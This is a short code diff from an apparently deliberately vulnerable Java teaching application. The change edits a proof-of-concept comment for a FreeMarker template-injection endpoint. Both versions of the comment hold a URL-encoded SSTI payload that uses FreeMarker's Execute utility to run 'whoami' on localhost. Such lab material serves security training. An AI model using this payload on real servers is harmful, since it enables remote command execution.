@@ -118,7 +118,7 @@ public class SSTI {
     /**
      * SpringBoot FreeMarker 模板注入
      *
-     * @poc http://127.0.0.1:8888/vulnapi/SSTI/freemarker/vul?file=index.ftl&content=%3C%23assign%20ex%3d%22freemarker%2etemplate%2eutility%2eExecute%22%3fnew%28%29%3E%20%24%7b%20ex%28%22whoami%22%29%20%7d
+     * @poc http://127.0.0.1:8888/vulnapi/SSTI/freemarker/vul?file=indexxx.ftl&content=%3C%23assign%20ex%3d%22freemarker%2etemplate%2eutility%2eExecute%22%3fnew%28%29%3E%20%24%7b%20ex%28%22whoami%22%29%20%7d
      */
     @ApiOperation(value = "vul：freemarker模板注入")
     @GetMapping("/freemarker/vul")
